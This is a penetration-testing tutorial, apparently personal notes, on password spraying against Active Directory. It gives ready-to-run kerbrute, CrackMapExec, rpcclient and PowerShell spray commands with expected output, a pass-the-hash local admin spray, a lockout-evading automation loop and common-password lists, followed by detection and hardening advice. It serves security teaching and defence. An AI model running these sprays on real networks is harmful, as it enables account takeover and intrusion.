# Password Spray

### Overview

**Password spraying** is a credential attack technique that attempts to authenticate using a single common password across many user accounts before moving to the next password. Unlike traditional brute force attacks that try many passwords against one account (triggering lockouts), password spraying distributes attempts across multiple accounts, staying under the lockout threshold.

**Key Concepts:**

* **Horizontal Attack** - Targets many accounts with few passwords each
* **Lockout Avoidance** - Stays below account lockout thresholds
* **Common Password Lists** - Uses frequently-used passwords (Season+Year, Welcome1, Password123)
* **Time-Delayed Cycles** - Waits between spray attempts to reset observation windows

**Why this matters:** Password spraying is highly effective because organizations often have weak password policies, users choose predictable passwords, and the attack bypasses traditional security controls like account lockout policies.

**Common Protocols:**

* **445/TCP** - SMB (Primary target for domain authentication)
* **88/TCP** - Kerberos (Pre-authentication attacks)
* **389/TCP** - LDAP (Authentication testing)
* **3389/TCP** - RDP (Remote Desktop authentication)

***

### Exploitation Workflow Summary

1. Reconnaissance ├─ Identify domain controllers ├─ Enumerate valid usernames └─ Extract password policy
2. Policy Analysis ├─ Determine lockout threshold ├─ Calculate observation window ├─ Identify lockout duration └─ Find exempt accounts (built-in Administrator)
3. Wordlist Preparation ├─ Generate custom wordlists ├─ Use seasonal passwords (Spring2024!, Winter2024!) ├─ Include company-specific terms └─ Add common patterns (Welcome1, Password123)
4. Initial Spray Cycle ├─ Test one password across all users ├─ Record successful authentications ├─ Wait for observation window to reset └─ Document timing and results
5. Iterative Spraying ├─ Continue with next password ├─ Monitor for lockouts ├─ Adjust timing if needed └─ Validate successful credentials
6. Post-Exploitation ├─ Test credential scope (local vs domain) ├─ Identify privileged accounts ├─ Check for credential reuse └─ Enumerate accessible resources

***

### Prerequisites

#### Valid Username List

Before password spraying, you must enumerate valid domain usernames. Users should be identified through:

* **Kerberos user enumeration** (preferred - no authentication required)
* **LDAP queries** (if anonymous access allowed)
* **RID cycling** (legacy systems)
* **Public information** (LinkedIn, company websites)

**See related topic:** \[\[Users Identification]]

#### Password Policy Information

Critical policy information needed:

* Lockout threshold (attempts before lockout)
* Lockout observation window (time to reset counter)
* Lockout duration (how long account stays locked)
* Minimum password length
* Complexity requirements

**See related topic:** \[\[Password Policy]]

***

### Custom Wordlist Generation

#### Understanding Effective Wordlists

**Generic passwords are ineffective**. The best wordlists are:

* **Context-aware** - Include company name, location, industry terms
* **Seasonal** - Current season + year (Spring2024!, Fall2024!)
* **Pattern-based** - Common formats (Month+Year!, Welcome+Number)
* **Geographically relevant** - Local sports teams, cities, landmarks

#### LDAP-Based Wordlist Harvesting

**LDAPWordListHarvester** extracts words from LDAP attributes (descriptions, comments, department names) to create context-aware password lists.

**Basic usage:**

```bash
# Extract words from LDAP attributes
python3 pyLDAPWordlistHarvester.py -d domain.local -u username -p password -o wordlist.txt
```

**Why this works:** LDAP attributes often contain:

* Company-specific terminology
* Department names
* Location information
* Common phrases used in the organization

**Example extracted terms:**

```
Marketing
Headquarters
Phoenix
InlaneFreight
Support
Engineering
```

These become password candidates:

```
Marketing2024!
Phoenix@2024
InlaneFreight123
Support2024!
```

#### Geographic Wordlist Generation

**GeoWordlists** creates location-based passwords using cities, landmarks, and regional terms.

**Concept:** Organizations often use local geography in passwords:

* City names (NewYork2024!, London2024!)
* Local sports teams (Yankees2024!, Lakers123!)
* Regional landmarks (BigBen123, StatueOfLiberty!)

**Manual geographic wordlist creation:**

```bash
# Create seasonal passwords for multiple cities
echo "Phoenix2024!" > geo_passwords.txt
echo "Boston2024!" >> geo_passwords.txt
echo "Dallas2024!" >> geo_passwords.txt
```

#### Common Password Patterns

**Most effective password spray patterns:**

```
Season + Year + Special:
├─ Winter2024!
├─ Spring2024!
├─ Summer2024!
└─ Fall2024!

Company + Pattern:
├─ CompanyName123
├─ CompanyName2024
└─ CompanyName!

Welcome Variants:
├─ Welcome1
├─ Welcome123
├─ Welcome2024
└─ Welcome@123

Month + Year:
├─ January2024!
├─ December2024!
└─ March2024!

Simple Patterns:
├─ Password123
├─ Password123!
├─ Passw0rd!
└─ P@ssw0rd123
```

***

### Password Spraying Tools

#### RPCclient Method

**RPCclient** uses RPC protocol to test authentication against Windows systems.

**Basic password spray:**

```bash
for u in $(cat valid_users.txt); do 
    rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority
done
```

**How it works:**

1. Reads each username from `valid_users.txt`
2. Attempts authentication with password "Welcome1"
3. Executes `getusername` command if auth succeeds
4. Filters output to show only successful attempts

**Expected output (successful authentication):**

```
Account Name: jsmith, Authority Name: INLANEFREIGHT
Account Name: adavis, Authority Name: INLANEFREIGHT
```

**Expected output (failed authentication):**

```
Cannot connect to server. Error was NT_STATUS_LOGON_FAILURE
```

**Limitations:**

* Slower than other methods
* No built-in timing controls
* Manual observation window management required

#### Kerbrute Password Spray

**Kerbrute** uses Kerberos pre-authentication to test passwords without triggering NTLM authentication logs.

**Basic password spray:**

```bash
kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt Welcome1
```

**Parameters explained:**

* `passwordspray` - Spray mode (one password, many users)
* `-d inlanefreight.local` - Target domain name
* `--dc 172.16.5.5` - Domain controller IP address
* `valid_users.txt` - File containing usernames (one per line)
* `Welcome1` - Password to test

**Expected output:**

```
2024/12/21 10:15:32 >  [+] VALID LOGIN:  jsmith@inlanefreight.local:Welcome1
2024/12/21 10:15:33 >  [+] VALID LOGIN:  adavis@inlanefreight.local:Welcome1
2024/12/21 10:15:45 >  Done! Tested 150 logins (2 successes) in 15.234 seconds
```

**Advantages:**

* Fast execution
* Uses Kerberos (less likely to trigger alerts)
* Clear success/fail indication
* Built-in rate limiting

**Best practice timing:**

```bash
# Wait 31 minutes between sprays (if lockout window is 30 minutes)
kerbrute passwordspray -d domain.local --dc 10.10.10.10 users.txt Welcome1
sleep 1860  # 31 minutes
kerbrute passwordspray -d domain.local --dc 10.10.10.10 users.txt Spring2024!
```

#### CrackMapExec (CME) Password Spray

**CrackMapExec** is the most versatile tool for password spraying across SMB protocol.

**Basic password spray (find any valid credentials):**

```bash
crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +
```

**Parameters:**

* `smb` - Target SMB protocol
* `172.16.5.5` - Domain controller IP
* `-u valid_users.txt` - Username list
* `-p Password123` - Single password to test
* `| grep +` - Filter to show only successful attempts

**Expected output:**

```
SMB  172.16.5.5  445  DC01  [+] DOMAIN\jsmith:Password123
SMB  172.16.5.5  445  DC01  [+] DOMAIN\adavis:Password123
```

**Continue on success (don't stop at first valid credential):**

```bash
crackmapexec smb 172.16.5.5 -u valid_users.txt -p Welcome1 --continue-on-success
```

**Why use --continue-on-success:**

* Finds ALL valid credentials, not just the first
* Essential for comprehensive assessment
* Identifies multiple compromised accounts

**Expected output with continue-on-success:**

```
SMB  172.16.5.5  445  DC01  [+] DOMAIN\jsmith:Welcome1
SMB  172.16.5.5  445  DC01  [-] DOMAIN\kjones:Welcome1 STATUS_LOGON_FAILURE
SMB  172.16.5.5  445  DC01  [+] DOMAIN\adavis:Welcome1
SMB  172.16.5.5  445  DC01  [-] DOMAIN\rthomas:Welcome1 STATUS_LOGON_FAILURE
SMB  172.16.5.5  445  DC01  [+] DOMAIN\mwilson:Welcome1
```

#### Username as Password Attack

**Common weakness:** Users sometimes have their username as their password.

**Test username=password across all accounts:**

```bash
crackmapexec smb 192.168.56.11 -u users.txt -p users.txt --no-bruteforce --continue-on-success
```

**Parameters:**

* `-u users.txt` - Username list
* `-p users.txt` - Same file used as password list
* `--no-bruteforce` - Test each username ONLY with itself (not all combinations)
* `--continue-on-success` - Find all matches

**How --no-bruteforce works:**

```
WITHOUT --no-bruteforce (tests all combinations):
jsmith:jsmith ✓
jsmith:adavis
jsmith:kjones
adavis:jsmith
adavis:adavis ✓
adavis:kjones
...

WITH --no-bruteforce (tests only matching pairs):
jsmith:jsmith ✓
adavis:adavis ✓
kjones:kjones ✓
```

**Expected output:**

```
SMB  192.168.56.11  445  DC01  [+] DOMAIN\jsmith:jsmith
SMB  192.168.56.11  445  DC01  [+] DOMAIN\testuser:testuser
```

#### Local Administrator Spray

**Testing local administrator accounts** across multiple systems with the same password (common in environments without LAPS).

**Spray local admin hash across subnet:**

```bash
crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +
```

**Parameters explained:**

* `--local-auth` - Authenticate to local SAM (not domain)
* `172.16.5.0/23` - IP range (512 addresses)
* `-u administrator` - Local admin username
* `-H 88ad09182de639ccc6579eb0849751cf` - NTLM hash (pass-the-hash)
* `| grep +` - Show only successful authentications

**Expected output:**

```
SMB  172.16.5.10  445  WORKSTATION01  [+] WORKSTATION01\administrator:88ad09182de639ccc6579eb0849751cf (Pwn3d!)
SMB  172.16.5.25  445  WORKSTATION02  [+] WORKSTATION02\administrator:88ad09182de639ccc6579eb0849751cf (Pwn3d!)
SMB  172.16.5.43  445  SERVER01       [+] SERVER01\administrator:88ad09182de639ccc6579eb0849751cf (Pwn3d!)
```

**What "Pwn3d!" means:**

* Successful authentication
* Account has administrative privileges
* Remote code execution possible
* Can dump credentials, access files, etc.

**Why this works:** Organizations often:

* Use same local admin password on all workstations
* Don't implement LAPS
* Don't rotate local admin passwords
* Image systems with same local admin hash

***

### PowerShell-Based Password Spray

#### DomainPasswordSpray Module

**DomainPasswordSpray.ps1** is a PowerShell script for internal password spraying from a domain-joined system.

**Import and execute:**

```powershell
Import-Module .\DomainPasswordSpray.ps1
Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
```

**Parameters:**

* `-Password Welcome1` - Password to test
* `-OutFile spray_success` - Save results to file
* `-ErrorAction SilentlyContinue` - Suppress error messages

**What it does automatically:**

1. Enumerates all domain users (no list needed)
2. Retrieves password policy
3. Calculates safe spray timing
4. Performs spray with built-in delays
5. Saves successful credentials to file

**Expected output:**

```
[*] Current domain: INLANEFREIGHT.LOCAL
[*] Performing password spray against 1543 user accounts
[*] Removed 3 disabled accounts from list
[*] Password lockout threshold: 5
[*] Observation window: 30 minutes
[*] Spraying password: Welcome1
[*] This will take approximately 2 minutes

[+] SUCCESS! Username: jsmith Password: Welcome1
[+] SUCCESS! Username: adavis Password: Welcome1

[*] Password spray completed
[*] 2 valid credentials found
[*] Results saved to: spray_success.txt
```

**Advantages:**

* Runs from Windows without external tools
* Automatically handles timing
* Respects password policy
* Domain-integrated (no DC IP needed)

**Limitations:**

* Requires PowerShell execution policy bypass
* May trigger Windows Defender
* Logged in Windows event logs
* Requires network access to DC

***

### Advanced Password Spraying Techniques

#### Statistically Likely Usernames

**Concept:** When you don't have a username list, generate statistically probable usernames based on common naming conventions.

**Common username formats:**

```
firstname.lastname (john.smith)
firstnamelastname (johnsmith)
flastname (jsmith)
firstnamel (johns)
first.last (john.s)
lastname (smith)
firstname (john)
```

**Why this works:** Organizations follow predictable username patterns. By testing common formats with known employee names (from LinkedIn, company websites), you can identify valid accounts.

**Example workflow:**

```bash
# Known employees from LinkedIn
echo "John Smith" > employees.txt
echo "Sarah Davis" >> employees.txt

# Generate username variants
# john.smith, jsmith, johns, smithj, etc.

# Test with Kerbrute (no lockout risk for invalid users)
kerbrute userenum -d domain.local --dc 10.10.10.10 generated_usernames.txt
```

#### Continuous Password Spraying Strategy

**Time-based attack strategy** that continuously sprays passwords while respecting lockout policies.

**Policy example:**

* Lockout threshold: 5 attempts
* Observation window: 30 minutes
* Lockout duration: 30 minutes

**Safe continuous strategy:**

```bash
# Hour 1 (00:00) - Password 1
crackmapexec smb DC -u users.txt -p 'Winter2024!' --continue-on-success

# Wait 31 minutes (00:31)
sleep 1860

# Hour 1 (00:31) - Password 2  
crackmapexec smb DC -u users.txt -p 'Welcome1' --continue-on-success

# Wait 31 minutes (01:02)
sleep 1860

# Hour 2 (01:02) - Password 3
crackmapexec smb DC -u users.txt -p 'Spring2024!' --continue-on-success

# Continue pattern...
```

**Daily capacity:**

```
Minutes per day: 1440
Minutes per cycle: 31
Cycles per day: 46
Safe attempts per user: 3 per cycle
Total passwords tested per day: 46 passwords per user
```

**Automation script example:**

```bash
#!/bin/bash
passwords=("Winter2024!" "Welcome1" "Spring2024!" "Password123" "Company2024!")

for pass in "${passwords[@]}"; do
    echo "[*] Spraying password: $pass"
    crackmapexec smb 172.16.5.5 -u users.txt -p "$pass" --continue-on-success | grep +
    echo "[*] Waiting 31 minutes before next spray..."
    sleep 1860
done
```

***

### Troubleshooting

#### Error: "STATUS\_ACCOUNT\_LOCKED\_OUT"

**Problem:** Account lockout detected during spray

```
SMB  172.16.5.5  445  DC01  [-] DOMAIN\jsmith:Password123 STATUS_ACCOUNT_LOCKED_OUT
```

**Immediate actions:**

1. **STOP the attack immediately**
2. Wait for lockout duration to pass (check password policy)
3. Review your timing - you exceeded observation window
4. Reduce attempts per cycle

**Prevention:**

```bash
# If policy is 5 attempts / 30 minutes
# Use only 3 attempts per cycle with 31 minute wait

# Safe spray cycle
crackmapexec smb DC -u users.txt -p 'Password1' --continue-on-success
sleep 1860  # 31 minutes
crackmapexec smb DC -u users.txt -p 'Password2' --continue-on-success
```

#### Error: "Kerberos SessionError: KRB\_AP\_ERR\_SKEW"

**Problem:** Clock skew between attacker and DC

```
Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
```

**Solution:** Synchronize time with domain controller:

```bash
# Install NTP client
sudo apt install ntpdate

# Sync with DC
sudo ntpdate 172.16.5.5

# Verify time
date
```

**Why it works:** Kerberos requires time synchronization within 5 minutes (default). Clock skew causes authentication to fail.

#### Error: "No Valid Credentials Found"

**Problem:** Spray completed but found no valid passwords

```
[*] Password spray completed
[*] 0 valid credentials found
```

**Possible causes:**

1. **Strong password policy enforced**
   * Minimum length > 15 characters
   * Complex requirements enforced
   * Password history preventing common passwords
2. **Passwords tested are too generic**
   * Try organization-specific passwords
   * Use seasonal passwords
   * Generate LDAP-based wordlist
3. **Accounts use different authentication**
   * MFA enforced
   * Smart card required
   * Federated authentication (SSO)

**Solutions:**

```bash
# Generate custom wordlist from LDAP
python3 pyLDAPWordlistHarvester.py -d domain.local -u user -p pass -o custom.txt

# Test seasonal passwords
echo "Winter2024!" > seasonal.txt
echo "Spring2024!" >> seasonal.txt
echo "Summer2024!" >> seasonal.txt
echo "Fall2024!" >> seasonal.txt

# Spray with custom list
for pass in $(cat seasonal.txt); do
    crackmapexec smb DC -u users.txt -p "$pass" --continue-on-success | grep +
    sleep 1860
done
```

#### Error: "Connection Timeout"

**Problem:** Cannot reach domain controller

```
[-] Connection error: [Errno 110] Connection timed out
```

**Solution:**

1. Verify DC is reachable:

```bash
ping 172.16.5.5
```

2. Check if SMB port is open:

```bash
nmap -p 445 172.16.5.5
```

3. Verify network routing:

```bash
traceroute 172.16.5.5
```

4. Try different protocol:

```bash
# If SMB blocked, try Kerberos
kerbrute passwordspray -d domain.local --dc 172.16.5.5 users.txt Welcome1
```

***

### Defense and Remediation

#### Strong Password Requirements

**Implement robust password policies:**

**Minimum password length:**

* Standard accounts: 15 characters minimum
* Administrative accounts: 30 characters minimum
* Service accounts: 30 characters minimum (managed)
* Break glass accounts: 30 characters minimum

**Password complexity:**

```
Recommended: Passphrase-based passwords
Example: CorrectHorseBatteryStaple2024!

NOT recommended: Complex but short
Example: P@ssw0rd! (only 9 characters, easily cracked)
```

**Four-random-words method:**

```
Minimum 15 characters
Use 4 random, unrelated words
Example: "BlueElephantPizzaTurtle"
```

#### Account Lockout Configuration

**Implement strict lockout policies:**

**Recommended settings:**

```
Lockout threshold: 5 attempts
Lockout duration: 30 minutes (or until admin unlock)
Observation window: 30 minutes
```

**Important exceptions:**

```
Break glass accounts: May need exemption
Service accounts: Should use managed passwords (no lockout needed)
Built-in Administrator: Consider disabling if not needed
```

#### Local Administrator Password Solution (LAPS)

**LAPS prevents local admin password reuse:**

**What LAPS does:**

* Generates unique random password for each system's local admin
* Stores passwords in Active Directory (encrypted)
* Automatically rotates passwords on schedule
* Prevents lateral movement via local admin

**Implementation:**

```
1. Deploy LAPS via Group Policy
2. Configure password length (30+ characters)
3. Set rotation interval (30 days recommended)
4. Restrict password read access to IT admins only
```

**Result:** Local admin spray attacks become ineffective because each system has a unique password.

#### Monitoring and Detection

**Key indicators of password spraying:**

**Windows Event Logs:**

```
Event ID 4625: Failed logon attempts
Event ID 4740: Account locked out
Event ID 4771: Kerberos pre-authentication failed
Event ID 4648: Explicit credential logon attempt
```

**Detection pattern:**

```
Multiple Event ID 4625 from same source IP
Targeting many different accounts
Within short time period
Using same password
```

**SIEM detection rule example:**

```
IF failed_logon_count > 50
AND unique_users > 20  
AND time_window < 10 minutes
AND source_ip = same
THEN alert "Possible Password Spray Attack"
```

#### Additional Security Controls

**Disable NTLM authentication:**

* NTLM doesn't support MFA
* Can be misused to bypass MFA requirements
* Enable Kerberos-only authentication where possible

**Implement credential scanning:**

* Scan network for cleartext credentials (monthly)
* Look for credentials in file shares
* Check for credentials in scripts
* Audit web.config and configuration files

**Configure built-in Administrator:**

```
1. Rename default "Administrator" account
2. Mark as "sensitive and cannot be delegated"
3. Disable if not needed for recovery
4. Implement strong password (30+ characters)
5. Monitor all logons with this account
```

**Deploy Multi-Factor Authentication (MFA):**

* Enforce MFA for all accounts (especially administrative)
* Use conditional access policies
* Block legacy authentication protocols
* Implement risk-based authentication

***

### Quick Reference

#### Spray Commands by Tool

```bash
# RPCclient
for u in $(cat users.txt); do rpcclient -U "$u%Welcome1" -c "getusername;quit" DC_IP | grep Authority; done

# Kerbrute
kerbrute passwordspray -d domain.local --dc DC_IP users.txt Welcome1

# CrackMapExec - Basic
crackmapexec smb DC_IP -u users.txt -p Password123 | grep +

# CrackMapExec - Continue on success
crackmapexec smb DC_IP -u users.txt -p Welcome1 --continue-on-success

# CrackMapExec - Username as password
crackmapexec smb DC_IP -u users.txt -p users.txt --no-bruteforce --continue-on-success

# CrackMapExec - Local admin spray
crackmapexec smb 10.10.10.0/24 --local-auth -u administrator -H NTLM_HASH | grep +

# PowerShell
Import-Module .\DomainPasswordSpray.ps1
Invoke-DomainPasswordSpray -Password Welcome1 -OutFile results.txt
```

#### Common Password Patterns

```
# Seasonal passwords
Winter2024!
Spring2024!
Summer2024!
Fall2024!

# Welcome variants
Welcome1
Welcome123
Welcome2024
Welcome@123

# Month + Year
January2024!
February2024!
December2024!

# Company patterns
CompanyName123
CompanyName2024!
CompanyName!

# Generic common
Password123
Password123!
Passw0rd!
P@ssw0rd123
```

#### Safe Spray Timing Calculator

```
Given policy:
- Lockout threshold: 5 attempts
- Observation window: 30 minutes

Safe strategy:
- Attempts per cycle: 3 (buffer of 2)
- Wait between cycles: 31 minutes (exceeds window)
- Daily capacity: ~46 passwords per user

Example timing:
00:00 - Spray password 1
00:31 - Spray password 2  
01:02 - Spray password 3
01:33 - Spray password 4
```

#### Detection Indicators

```
Windows Event IDs to monitor:
- 4625: Failed logon
- 4740: Account locked
- 4771: Kerberos pre-auth failed
- 4648: Explicit credential use

Alert conditions:
- >50 failed logons from one IP
- >20 unique users targeted
- Within 10 minute window
- Same password pattern
```

***

### Related Topics

* \[\[Password Policy]]
* \[\[Users Identification]]
* \[\[SMB Protocol]]
* \[\[Kerberos Authentication]]
* \[\[Active Directory Enumeration]]
* \[\[Lateral Movement]]
* \[\[Credential Attacks]]
* \[\[LAPS Implementation]]

***

**Support**: [Ko-fi](https://ko-fi.com/Y8Y41FQ2GA) | [Buy Me a Coffee](https://buymeacoffee.com/0xss0rz)
